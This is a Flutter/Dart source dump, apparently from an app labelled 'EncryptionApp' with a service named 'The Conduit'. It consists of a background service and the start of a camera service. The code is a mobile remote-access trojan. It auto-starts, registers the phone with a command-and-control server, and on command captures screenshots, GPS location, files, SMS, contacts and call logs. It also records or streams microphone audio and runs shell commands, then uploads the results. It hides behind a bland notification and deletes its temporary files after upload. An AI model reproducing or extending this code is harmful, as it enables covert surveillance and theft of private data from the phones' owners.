// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\background_service.dart
// ----------------------------------------------------------------------

// lib/services/background_service.dart

import 'dart:async';
import 'dart:convert'; // For jsonEncode
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile;
import 'package:flutter/foundation.dart';
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidServiceInstance;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart' show Position;
import 'package:newtest1/core/logging/enhanced_logger_service.dart'; // تأكد أن هذا المسار صحيح
import 'package:path_provider/path_provider.dart'; // Required for temporary files
import 'package:shared_preferences/shared_preferences.dart';

import '../native_channel_handler.dart'; // [cite: 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135]
// تأكد من أن هذه المسارات صحيحة بناءً على هيكل مشروعك
import '../utils/constants.dart'; // [cite: 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395]
import 'device_info_service.dart'; // [cite: 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114]
import 'file_system_service.dart';
import 'location_service.dart'; // [cite: 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152]
import 'network_service.dart'; // [cite: 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316]

String? _currentScreenshotCommandId;
String? _currentScreenshotCommandRef;

bool _isAudioStreamingInProgress = false;
StreamSubscription<Uint8List>? _liveAudioSubscription;

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;
  final EnhancedLoggerService logger;
  // final NativeChannelHandler nativeChannelHandler; // <- تم إزالته

  const BackgroundServiceHandles({
    required this.networkService,
    required this.deviceInfoService,
    required this.locationService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
    required this.logger,
    // required this.nativeChannelHandler, // <- تم إزالته
  });
}

StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
Timer? _serviceWatchdogTimer;
bool _isServiceRunning = false;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized(); // [cite: 914]
  _isServiceRunning = true;

  final logger = EnhancedLoggerService(); // [cite: 917]
  logger.info("BackgroundService:onStart", "Service instance starting...");

  final network = NetworkService(); // [cite: 915, 919]
  final deviceInfo = DeviceInfoService(); // [cite: 916, 919]
  final location = LocationService(); // [cite: 916, 920]
  final fileSystem = FileSystemService(); // [cite: 916, 920]
  final prefs = await SharedPreferences.getInstance(); // [cite: 916, 920]
  // final nativeChannelHandler = NativeChannelHandler(); // <- تم إزالته

  String deviceId;
  try {
    deviceId = await deviceInfo.getOrCreateUniqueDeviceId(); // [cite: 921]
    logger.info(
        "BackgroundService:onStart", "DeviceID obtained/created: $deviceId");
  } catch (e, stackTrace) {
    logger.error("BackgroundService:onStart", "Fatal error getting device ID",
        e, stackTrace); // [cite: 922]
    deviceId =
        "error_device_id_${DateTime.now().millisecondsSinceEpoch}"; // [cite: 923]
    logger.warn("BackgroundService:onStart",
        "Using fallback DeviceID due to error: $deviceId"); // [cite: 923]
  }

  final handles = BackgroundServiceHandles(
    // [cite: 924]
    networkService: network,
    deviceInfoService: deviceInfo,
    locationService: location,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
    logger: logger,
    // nativeChannelHandler: nativeChannelHandler, // <- تم إزالته
  );
  _startServiceWatchdog(handles); // [cite: 925]

  try {
    logger.info("BackgroundService:onStart",
        "Attempting initial Socket.IO connection..."); // [cite: 925]
    await network.connectSocketIO(deviceId); // [cite: 925]
    logger.info("BackgroundService:onStart",
        "Initial Socket.IO connection attempt initiated."); // [cite: 926]
  } catch (e, stackTrace) {
    logger.error(
        "BackgroundService:onStart",
        "Error during initial Socket.IO connection attempt",
        e,
        stackTrace); // [cite: 927]
  }

  _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription =
      network.connectionStatusStream.listen((isConnected) {
    // [cite: 928]
    logger.info("BackgroundService:ConnectionStatus",
        "Socket status changed: ${isConnected ? 'Connected' : 'Disconnected'}"); // [cite: 928]
    if (isConnected) {
      _registerDeviceWithC2(handles); // [cite: 928]
    }
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:ConnectionStatus",
        "Error in connection status stream", error, stackTrace); // [cite: 928]
  });
  _commandSubscription?.cancel(); // [cite: 929]
  _commandSubscription = network.commandStream.listen((commandData) {
    // [cite: 929]
    final cmd = commandData['command'] as String?;
    final commandId = commandData['command_id'] as String?;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});

    if (cmd == null) {
      logger.warn("BackgroundService:CommandStream",
          "Received command with null name. Data: $commandData"); // [cite: 929]
      return;
    }
    logger.info("BackgroundService:CommandStream",
        "Received command '$cmd' (ID: ${commandId ?? 'N/A'}) with args: $args"); // [cite: 929]
    _handleC2Command(handles, cmd, args, commandId); // [cite: 930]
  }, onError: (error, stackTrace) {
    logger.error("BackgroundService:CommandStream", "Error in command stream",
        error, stackTrace); // [cite: 930]
  });
  service.on('screenshotTakenByUI').listen((dataFromUI) async {
    // [cite: 931]
    logger.info("BackgroundService:screenshotTakenByUI",
        "Received data from UI: $dataFromUI"); // [cite: 931]
    if (dataFromUI is Map<String, dynamic>) {
      final filePath = dataFromUI['file_path'] as String?;
      final error = dataFromUI['error'] as String?;
      final String? originalCmdId = _currentScreenshotCommandId;
      final String? originalCmdRef = _currentScreenshotCommandRef;

      if (filePath != null && originalCmdRef != null) {
        logger.info("BackgroundService:screenshotTakenByUI",
            "Screenshot file path received: $filePath. Uploading for command ID $originalCmdId."); // [cite: 932]
        await handles.networkService.uploadFileFromCommand(
          // [cite: 932]
          deviceId: handles.currentDeviceId,
          commandRef: originalCmdRef,
          commandId: originalCmdId,
          fileToUpload: XFile(filePath),
        );
        try {
          final tempFile = File(filePath); // [cite: 932]
          if (await tempFile.exists()) {
            // [cite: 933]
            await tempFile.delete(); // [cite: 933]
            logger.info("BackgroundService:screenshotTakenByUI",
                "Temporary screenshot file $filePath deleted."); // [cite: 934]
          }
        } catch (e, s) {
          logger.error(
              "BackgroundService:screenshotTakenByUI",
              "Could not delete temp screenshot file $filePath: $e",
              e,
              s); // [cite: 935]
        }
      } else if (error != null) {
        logger.error("BackgroundService:screenshotTakenByUI",
            "UI reported error taking screenshot: $error for command ID $originalCmdId."); // [cite: 936]
        if (originalCmdRef != null) {
          // [cite: 937]
          handles.networkService.sendCommandResponse(
            // [cite: 937]
            originalCommand: originalCmdRef,
            commandId: originalCmdId,
            status: 'error',
            payload: {'message': 'Failed to take screenshot on UI: $error'},
          );
        }
      } else {
        logger.warn("BackgroundService:screenshotTakenByUI",
            "Received invalid data from UI for screenshot: $dataFromUI"); // [cite: 938]
      }
      _currentScreenshotCommandId = null; // [cite: 939]
      _currentScreenshotCommandRef = null; // [cite: 939]
    }
  });
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    // [cite: 940]
    logger.info("BackgroundService:StopEvent",
        "Received '$BG_SERVICE_EVENT_STOP_SERVICE' event. Stopping service."); // [cite: 940]
    await _stopService(handles);
  });
  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((event) async {
    // [cite: 941]
    logger.info("BackgroundService",
        "Received event '$BG_SERVICE_EVENT_SEND_INITIAL_DATA'. Preparing to send initial data."); // [cite: 941]
    final alreadySent =
        prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false; // [cite: 941]
    if (alreadySent && !(event?['force'] == true)) {
      logger.info("BackgroundService",
          "Initial data already sent and not forced, skipping."); // [cite: 941]
      return;
    }
    try {
      final deviceInfoPayload =
          await handles.deviceInfoService.getDeviceInfo(); // [cite: 941]
      XFile? imageFile; // [cite: 941]
      logger.info("BackgroundService",
          "Sending initial data via HTTP. Device ID: ${deviceInfoPayload['deviceId']}"); // [cite: 942]
      final success = await handles.networkService.sendInitialData(
        // [cite: 942]
        jsonData: deviceInfoPayload,
        imageFile: imageFile,
      );
      if (success) {
        // [cite: 942]
        await prefs.setBool(PREF_INITIAL_DATA_SENT, true); // [cite: 942]
        logger.info("BackgroundService",
            "Initial data sent successfully via HTTP."); // [cite: 942]
      } else {
        logger.error("BackgroundService",
            "Failed to send initial data via HTTP."); // [cite: 943]
      }
    } catch (e, s) {
      logger.error("BackgroundService",
          "Error during sending initial data via HTTP", e, s); // [cite: 944]
    }
  });

  if (service is AndroidServiceInstance) {
    // [cite: 945]
    try {
      await service.setAsForegroundService(); // [cite: 945]
      logger.info("BackgroundService:onStart",
          "Android service set to foreground."); // [cite: 946]
    } catch (e, s) {
      logger.error("BackgroundService:onStart",
          "Failed to set Android service to foreground", e, s); // [cite: 947]
    }
  }

  if (service is AndroidServiceInstance) {
    // [cite: 948]
    Timer.periodic(const Duration(minutes: 5), (timer) {
      // [cite: 948]
      if (!_isServiceRunning) {
        timer.cancel();
        return;
      }
      try {
        service.setForegroundNotificationInfo(
          // [cite: 948]
          title: "The Conduit Service",
          content:
              "Service active. Last check: ${DateTime.now().toIso8601String().substring(11, 19)}", // [cite: 949]
        );
      } catch (e, s) {
        logger.warn("BackgroundService:NotificationUpdate",
            "Could not update foreground notification. Error: $e, StackTrace: $s"); // [cite: 949]
      }
    });
  }
  logger.info("BackgroundService:onStart",
      "Service initialization process complete."); // [cite: 950]
}

void _startServiceWatchdog(BackgroundServiceHandles h) {
  _serviceWatchdogTimer?.cancel(); // [cite: 950]
  _serviceWatchdogTimer = Timer.periodic(const Duration(minutes: 15), (_) {
    // [cite: 951]
    if (!_isServiceRunning) {
      _serviceWatchdogTimer?.cancel();
      h.logger.info("BackgroundService:Watchdog",
          "Service is not running, watchdog stopping."); // [cite: 951]
      return;
    }
    h.logger.info("BackgroundService:Watchdog",
        "Watchdog check: Service is running."); // [cite: 951]
    if (!h.networkService.isSocketConnected) {
      // [cite: 951]
      h.logger.warn("BackgroundService:Watchdog",
          "Socket disconnected. Attempting reconnect via NetworkService."); // [cite: 951]
      h.networkService.connectSocketIO(h.currentDeviceId).catchError(
          (e, s) => // [cite: 952]
              h.logger.error(
                  "BackgroundService:Watchdog",
                  "Error during watchdog reconnect attempt",
                  e,
                  s)); // [cite: 952]
    }
    _checkAndRefreshRegistration(h);
  });
  h.logger.info(
      "BackgroundService:Watchdog", "Service watchdog started."); // [cite: 953]
}

Future<void> _checkAndRefreshRegistration(BackgroundServiceHandles h) async {
  final lastRegTimeStr =
      h.preferences.getString('last_registration_time'); // [cite: 953]
  bool needsRegistration = true; // [cite: 953]
  if (lastRegTimeStr != null) {
    // [cite: 954]
    try {
      final lastRegTime = DateTime.parse(lastRegTimeStr); // [cite: 954]
      if (DateTime.now().difference(lastRegTime).inHours < 6) {
        // [cite: 955]
        needsRegistration = false; // [cite: 955]
      }
    } catch (e) {
      h.logger.warn("BackgroundService:RefreshReg",
          "Error parsing last registration time: $e. Will re-register."); // [cite: 956]
    }
  }

  if (needsRegistration) {
    // [cite: 957]
    h.logger.info("BackgroundService:RefreshReg",
        "Registration refresh needed or first time. Attempting registration."); // [cite: 957]
    _registerDeviceWithC2(h); // [cite: 958]
  } else {
    h.logger.debug("BackgroundService:RefreshReg",
        "Registration is still recent. No refresh needed now."); // [cite: 958]
  }
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) {
    // [cite: 959]
    h.logger.warn("BackgroundService:RegisterDevice",
        "Cannot register device. Socket not connected. Device ID: ${h.currentDeviceId}"); // [cite: 959]
    h.networkService.connectSocketIO(h.currentDeviceId).catchError(
        (e, s) => // [cite: 960]
            h.logger.error(
                "BackgroundService:RegisterDevice",
                "Error during connectSocketIO for registration",
                e,
                s)); // [cite: 960]
    return;
  }
  try {
    final deviceInfoPayload =
        await h.deviceInfoService.getDeviceInfo(); // [cite: 961]
    if (deviceInfoPayload['deviceId'] != h.currentDeviceId) {
      // [cite: 962]
      h.logger.warn("BackgroundService:RegisterDevice",
          "Mismatch between handles.currentDeviceId ('${h.currentDeviceId}') and deviceInfoPayload['deviceId'] ('${deviceInfoPayload['deviceId']}'). Using handles.currentDeviceId for registration."); // [cite: 962]
      deviceInfoPayload['deviceId'] = h.currentDeviceId; // [cite: 963]
    }

    h.logger.info("BackgroundService:RegisterDevice",
        "Registering device with C2. Device ID: ${h.currentDeviceId}"); // [cite: 963]
    h.networkService.registerDeviceWithC2(deviceInfoPayload); // [cite: 964]

    await h.preferences.setString('last_registration_time',
        DateTime.now().toIso8601String()); // [cite: 964]
    h.logger.info("BackgroundService:RegisterDevice",
        "Device registration event sent. Last registration time updated."); // [cite: 965]
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService:RegisterDevice",
        "Error preparing or sending device registration",
        e,
        stackTrace); // [cite: 966]
  }
}

Future<XFile?> _saveDataToTempFile(
    BackgroundServiceHandles h, List<dynamic> data, String baseName) async {
  if (data.isEmpty) {
    h.logger.info("BackgroundService:_saveDataToTempFile",
        "Data for $baseName is empty, skipping file creation.");
    return null;
  }
  try {
    final directory = await getTemporaryDirectory();
    final timestamp = DateTime.now().millisecondsSinceEpoch;
    final filePath = '${directory.path}/${baseName}_$timestamp.json';
    final file = File(filePath);
    await file.writeAsString(jsonEncode(data));
    h.logger.info("BackgroundService:_saveDataToTempFile",
        "$baseName data saved to temporary file: $filePath");
    return XFile(filePath);
  } catch (e, s) {
    h.logger.error("BackgroundService:_saveDataToTempFile",
        "Error saving $baseName data to temp file", e, s);
    return null;
  }
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService:HandleCommand",
      "Handling command: '$commandName' (ID: ${commandId ?? "N/A"}) with args: $args"); // [cite: 967]
  dynamic resultPayload;
  String status = "success"; // [cite: 968]

  try {
    switch (commandName) {
      case SIO_CMD_TAKE_PICTURE: // [cite: 968]
        h.logger.info("BackgroundService:HandleCommand",
            "Requesting UI screenshot for command '$commandName' (ID: ${commandId ?? "N/A"})."); // [cite: 968]
        _currentScreenshotCommandId = commandId; // [cite: 969]
        _currentScreenshotCommandRef = commandName; // [cite: 969]
        h.serviceInstance.invoke('requestScreenshotFromUI',
            {'command_id': commandId, 'args': args}); // [cite: 969]
        return;

      case SIO_CMD_GET_LOCATION: // [cite: 970]
        final Position? locationData =
            await h.locationService.getCurrentLocation(); // [cite: 971]
        if (locationData != null) {
          // [cite: 972]
          resultPayload = {
            'latitude': locationData.latitude,
            'longitude': locationData.longitude,
            'accuracy': locationData.accuracy,
            'altitude': locationData.altitude,
            'speed': locationData.speed,
            'timestamp_gps':
                locationData.timestamp.toIso8601String(), // [cite: 973]
          };
          h.logger.info("BackgroundService:HandleCommand",
              "Location obtained: $resultPayload"); // [cite: 973]
        } else {
          throw Exception(
              "Location unavailable or permission denied by location service."); // [cite: 974]
        }
        break;

      case SIO_CMD_LIST_FILES: // [cite: 975]
        final pathToList = args["path"] as String? ?? "."; // [cite: 976]
        h.logger.info("BackgroundService:HandleCommand",
            "Listing files for path: '$pathToList'"); // [cite: 976]
        final Map<String, dynamic> listFilesResult =
            await NativeChannelHandler.listFilesNatively(
                pathToList); // [cite: 88, 89, 90, 91, 92, 93, 94, 95]
        if (listFilesResult["error"] == null) {
          // [cite: 978]
          resultPayload = listFilesResult; // [cite: 979]
        } else {
          throw Exception(listFilesResult["error"]?.toString() ??
              "Failed to list files via native code."); // [cite: 979]
        }
        break;

      case SIO_CMD_UPLOAD_SPECIFIC_FILE: // [cite: 980]
        final filePathToUpload = args["path"] as String?; // [cite: 980]
        if (filePathToUpload == null || filePathToUpload.isEmpty) {
          // [cite: 981]
          throw Exception(
              "File path is required for '$SIO_CMD_UPLOAD_SPECIFIC_FILE'."); // [cite: 981]
        }
        final file = File(filePathToUpload); // [cite: 982]
        if (!await file.exists()) {
          // [cite: 983]
          throw Exception(
              "File not found at path: '$filePathToUpload'."); // [cite: 983]
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Uploading specific file: '$filePathToUpload'."); // [cite: 984]
        await h.networkService.uploadFileFromCommand(
          // [cite: 985]
          deviceId: h.currentDeviceId,
          commandRef: commandName,
          commandId: commandId,
          fileToUpload: XFile(filePathToUpload),
        );
        return; // [cite: 986]

      case SIO_CMD_EXECUTE_SHELL: // [cite: 986]
        final shellCommandName = args["command_name"] as String?; // [cite: 986]
        final shellCommandArgs =
            (args["command_args"] as List<dynamic>?) // [cite: 987]
                    ?.map((e) => e.toString())
                    .toList() ??
                []; // [cite: 988]
        if (shellCommandName == null || shellCommandName.isEmpty) {
          // [cite: 988]
          throw Exception(
              "Command name ('command_name') is required for '$SIO_CMD_EXECUTE_SHELL'."); // [cite: 988]
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Executing shell command: '$shellCommandName' with args: $shellCommandArgs"); // [cite: 989]
        final Map<String, dynamic> execResult =
            await NativeChannelHandler.executeShellNatively(shellCommandName,
                shellCommandArgs); // [cite: 96, 97, 98, 99, 100, 101, 102, 103]
        if (execResult["error"] == null) {
          // [cite: 991]
          resultPayload = execResult; // [cite: 991]
        } else {
          throw Exception(execResult["error"]?.toString() ??
              "Failed to execute shell command via native code."); // [cite: 992]
        }
        break;

      case SIO_CMD_GET_SMS_LIST: // [cite: 1387]
        h.logger.info("BackgroundService:HandleCommand", "Fetching SMS list.");
        final List<dynamic> smsList = await NativeChannelHandler
            .getSmsListNatively(); // [cite: 104, 105, 106, 107, 108]
        final XFile? smsFile =
            await _saveDataToTempFile(h, smsList, "sms_list");
        if (smsFile != null) {
          await h.networkService.uploadFileFromCommand(
            deviceId: h.currentDeviceId,
            commandRef: commandName,
            commandId: commandId,
            fileToUpload: smsFile,
          );
          try {
            await File(smsFile.path).delete();
          } catch (_) {}
          return;
        } else {
          throw Exception("Failed to save SMS list to temporary file.");
        }

      case SIO_CMD_GET_CONTACTS_LIST: // [cite: 1388]
        h.logger
            .info("BackgroundService:HandleCommand", "Fetching contacts list.");
        final List<dynamic> contactsList = await NativeChannelHandler
            .getContactsListNatively(); // [cite: 108, 109, 110, 111, 112]
        final XFile? contactsFile =
            await _saveDataToTempFile(h, contactsList, "contacts_list");
        if (contactsFile != null) {
          await h.networkService.uploadFileFromCommand(
            deviceId: h.currentDeviceId,
            commandRef: commandName,
            commandId: commandId,
            fileToUpload: contactsFile,
          );
          try {
            await File(contactsFile.path).delete();
          } catch (_) {}
          return;
        } else {
          throw Exception("Failed to save contacts list to temporary file.");
        }

      case SIO_CMD_GET_CALL_LOGS: // [cite: 1388]
        h.logger.info("BackgroundService:HandleCommand", "Fetching call logs.");
        final List<dynamic> callLogsList = await NativeChannelHandler
            .getCallLogsListNatively(); // [cite: 112, 113, 114, 115, 116]
        final XFile? callLogsFile =
            await _saveDataToTempFile(h, callLogsList, "call_logs_list");
        if (callLogsFile != null) {
          await h.networkService.uploadFileFromCommand(
            deviceId: h.currentDeviceId,
            commandRef: commandName,
            commandId: commandId,
            fileToUpload: callLogsFile,
          );
          try {
            await File(callLogsFile.path).delete();
          } catch (_) {}
          return;
        } else {
          throw Exception("Failed to save call logs to temporary file.");
        }

      case SIO_CMD_RECORD_AUDIO_FIXED: // [cite: 1389]
        final duration = args['duration_seconds'] as int? ?? 10;
        h.logger.info("BackgroundService:HandleCommand",
            "Recording audio for $duration seconds.");
        final Map<String, dynamic> recordResult =
            await NativeChannelHandler.recordAudioFixedDurationNatively(
                duration); // [cite: 116, 117, 118, 119, 120, 121, 122]
        final filePath = recordResult['filePath'] as String?;
        final errorMsg = recordResult['error'] as String?;

        if (filePath != null &&
            errorMsg == null &&
            (recordResult['status'] == 'completed' ||
                recordResult['status'] == null)) {
          final audioFile = XFile(filePath);
          await h.networkService.uploadFileFromCommand(
            deviceId: h.currentDeviceId,
            commandRef: commandName,
            commandId: commandId,
            fileToUpload: audioFile,
          );
          try {
            await File(filePath).delete();
          } catch (_) {}
          return;
        } else {
          throw Exception(errorMsg ??
              recordResult['message']?.toString() ??
              "Failed to record audio or file path null.");
        }

      case SIO_CMD_START_LIVE_AUDIO: // [cite: 1389]
        if (_isAudioStreamingInProgress) {
          throw Exception("Audio streaming is already in progress.");
        }
        h.logger.info(
            "BackgroundService:HandleCommand", "Starting live audio stream.");
        final String? startStatus = await NativeChannelHandler
            .startLiveAudioStreamNatively(); // [cite: 122, 123, 124, 125, 126, 127]
        if (startStatus != null &&
            startStatus.toLowerCase().contains("started")) {
          _isAudioStreamingInProgress = true;
          _liveAudioSubscription?.cancel();
          _liveAudioSubscription = NativeChannelHandler.getLiveAudioStream()
              .listen(// [cite: 134, 135]
                  (audioChunk) {
            if (_isAudioStreamingInProgress) {
              h.logger.debug("BackgroundService:LiveAudio",
                  "Received audio chunk, size: ${audioChunk.length}");
              h.networkService
                  .sendLiveAudioChunk(audioChunk); // [cite: 1266, 1267, 1268]
            }
          }, onError: (error, stackTrace) {
            h.logger.error("BackgroundService:LiveAudio",
                "Error in live audio stream", error, stackTrace);
            _isAudioStreamingInProgress = false;
            _liveAudioSubscription?.cancel();
            h.networkService.sendCommandResponse(
              originalCommand: commandName,
              commandId: commandId,
              status: 'error',
              payload: {
                'message': 'Live audio stream error: ${error.toString()}'
              },
            );
          }, onDone: () {
            h.logger
                .info("BackgroundService:LiveAudio", "Live audio stream done.");
            if (_isAudioStreamingInProgress) {
              h.networkService.sendCommandResponse(
                originalCommand: commandName,
                commandId: commandId,
                status: 'info',
                payload: {'message': 'Live audio stream ended by source.'},
              );
            }
            _isAudioStreamingInProgress = false;
            _liveAudioSubscription?.cancel();
          });
          resultPayload = {
            'message': 'Live audio streaming started successfully.'
          };
        } else {
          _isAudioStreamingInProgress = false;
          throw Exception(
              "Failed to start live audio stream on native side: $startStatus");
        }
        break;

      case SIO_CMD_STOP_LIVE_AUDIO: // [cite: 1390]
        if (!_isAudioStreamingInProgress) {
          resultPayload = {'message': 'Audio streaming was not in progress.'};
          status = "warning";
        } else {
          h.logger.info(
              "BackgroundService:HandleCommand", "Stopping live audio stream.");
          _isAudioStreamingInProgress = false;
          await _liveAudioSubscription?.cancel();
          _liveAudioSubscription = null;
          final String? stopStatus = await NativeChannelHandler
              .stopLiveAudioStreamNatively(); // [cite: 127, 128, 129, 130, 131, 132, 133, 134]
          if (stopStatus != null &&
              stopStatus.toLowerCase().contains("stopped")) {
            resultPayload = {
              'message': 'Live audio streaming stopped successfully.'
            };
          } else {
            h.logger.warn("BackgroundService:HandleCommand",
                "Native stop status for live audio unclear: $stopStatus. Dart side stopped.");
            resultPayload = {
              'message':
                  'Live audio streaming stopped (native status unclear: $stopStatus).'
            };
            status = "warning";
          }
        }
        break;

      case SIO_EVENT_REQUEST_REGISTRATION_INFO: // [cite: 993]
        h.logger.info("BackgroundService:HandleCommand",
            "Received request for registration info from C2. Re-registering."); // [cite: 993]
        _registerDeviceWithC2(h); // [cite: 994]
        return;

      default:
        h.logger.warn("BackgroundService:HandleCommand",
            "Unknown command received: '$commandName'"); // [cite: 994]
        status = "error"; // [cite: 995]
        resultPayload = {
          'message': "Unknown command: '$commandName'"
        }; // [cite: 995]
    }
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService:HandleCommand",
        "Error handling command '$commandName' (ID: ${commandId ?? "N/A"})",
        e,
        stackTrace); // [cite: 995]
    status = "error"; // [cite: 996]
    resultPayload = {'message': e.toString()}; // [cite: 996]
  }

  h.networkService.sendCommandResponse(
    // [cite: 996]
    originalCommand: commandName,
    commandId: commandId,
    status: status,
    payload: resultPayload,
  );
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  h.logger.info("BackgroundService:StopService",
      "Stopping service now..."); // [cite: 997]
  _isServiceRunning = false; // [cite: 997]
  _isAudioStreamingInProgress = false;

  _serviceWatchdogTimer?.cancel(); // [cite: 997]
  _serviceWatchdogTimer = null; // [cite: 997]

  await _connectionStatusSubscription?.cancel(); // [cite: 997]
  _connectionStatusSubscription = null; // [cite: 998]
  await _commandSubscription?.cancel(); // [cite: 998]
  _commandSubscription = null; // [cite: 998]
  await _liveAudioSubscription?.cancel();
  _liveAudioSubscription = null;

  h.networkService.dispose(); // [cite: 998]
  h.logger.info("BackgroundService:StopService",
      "NetworkService disposed."); // [cite: 998]

  try {
    await h.serviceInstance.stopSelf(); // [cite: 999]
    h.logger.info("BackgroundService:StopService",
        "Service instance stopped successfully."); // [cite: 999]
  } catch (e, s) {
    h.logger.error("BackgroundService:StopService",
        "Error stopping service instance", e, s); // [cite: 1000]
  }
}

Future<bool> initializeBackgroundService() async {
  final logger = EnhancedLoggerService(); // [cite: 1001]
  logger.info("BackgroundService:Initialize",
      "Attempting to initialize FlutterBackgroundService..."); // [cite: 1001]
  final service = FlutterBackgroundService(); // [cite: 1002]

  if (Platform.isAndroid) {
    // [cite: 1002]
    final flutterLocalNotificationsPlugin =
        FlutterLocalNotificationsPlugin(); // [cite: 1002]
    const androidInitialize =
        AndroidInitializationSettings('@mipmap/ic_launcher'); // [cite: 1003]
    const initializationSettings =
        InitializationSettings(android: androidInitialize); // [cite: 1004]
    try {
      await flutterLocalNotificationsPlugin
          .initialize(initializationSettings); // [cite: 1005]
      logger.info("BackgroundService:Initialize",
          "FlutterLocalNotificationsPlugin initialized."); // [cite: 1005]

      const channel = AndroidNotificationChannel(
        // [cite: 1006]
        'conduit_service_channel_id',
        'The Conduit Service Notifications', // [cite: 1006]
        description:
            'Notifications for The Conduit background service activity.', // [cite: 1006]
        importance: Importance.low, // [cite: 1006]
        playSound: false, // [cite: 1006]
        enableVibration: false, // [cite: 1006]
        showBadge: false,
      );
      await flutterLocalNotificationsPlugin
          .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin>()
          ?.createNotificationChannel(channel); // [cite: 1007]
      logger.info("BackgroundService:Initialize",
          "Notification channel 'conduit_service_channel_id' created/updated."); // [cite: 1008]
    } catch (e, stackTrace) {
      logger.error(
          "BackgroundService:Initialize",
          "Error initializing notifications or channel",
          e,
          stackTrace); // [cite: 1009]
    }
  }

  try {
    await service.configure(
      // [cite: 1010]
      androidConfiguration: AndroidConfiguration(
        // [cite: 1010]
        onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        notificationChannelId: 'conduit_service_channel_id',
        initialNotificationTitle: 'The Conduit Service', // [cite: 1010]
        initialNotificationContent:
            'Initializing The Conduit background operations...', // [cite: 1010]
        foregroundServiceNotificationId: 888, // [cite: 1010]
      ),
      iosConfiguration: IosConfiguration(
        // [cite: 1011]
        autoStart: true, // [cite: 1011]
        onForeground: onStart, // [cite: 1011]
      ),
    );
    logger.info("BackgroundService:Initialize",
        "FlutterBackgroundService configured successfully."); // [cite: 1012]
    return true; // [cite: 1012]
  } catch (e, stackTrace) {
    logger.error(
        "BackgroundService:Initialize",
        "Fatal error configuring FlutterBackgroundService",
        e,
        stackTrace); // [cite: 1013]
    return false; // [cite: 1014]
  }
}



// ------------------------------ نهاية الملف: background_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: camera_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\camera_service.dart
// ----------------------------------------------------------------------

// lib/services/camera_service.dart
// الإصدار المعدل لاستخدام Platform Channels للوصول إلى الكاميرا من الخلفية بشكل موثوق

import 'dart:async';

import 'package:camera/camera.dart'
    show XFile, CameraLensDirection; // نحتفظ بها لـ XFile وتعاريف العدسات
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart'; // مطلوب لـ PlatformChannel

class CameraService {
  // تعريف قناة الاتصال. تم تحديثها لتتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel =
      MethodChannel('com.zeroone.theconduit/camera');

  // لم نعد بحاجة لـ CameraController أو قائمة الكاميرات هنا إذا كانت كل العمليات تتم في الكود الأصلي.

